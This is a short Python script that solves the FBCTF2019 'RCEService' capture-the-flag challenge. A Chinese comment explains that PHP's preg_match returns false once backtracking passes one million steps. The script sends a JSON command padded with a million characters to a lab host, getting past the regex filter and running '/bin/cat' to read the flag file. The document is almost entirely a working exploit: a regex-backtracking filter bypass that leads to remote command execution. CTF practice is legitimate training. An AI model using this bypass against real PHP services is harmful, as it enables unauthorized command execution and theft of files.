import requests
'''
[FBCTF2019]RCEService
https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html
php正则preg_match()函数回溯超过100万次就返回flase，跟匹配失败一个效果
'''
payload = '{"cmd":"/bin/cat /home/rceservice/flag","test":"' + "a"*(1000000) + '"}'
res = requests.post("http://9fa186f6-bb33-43a1-8cd8-556aafdde4ba.node5.buuoj.cn:81/", data={"cmd":payload})
#print(payload)
print(res.text)
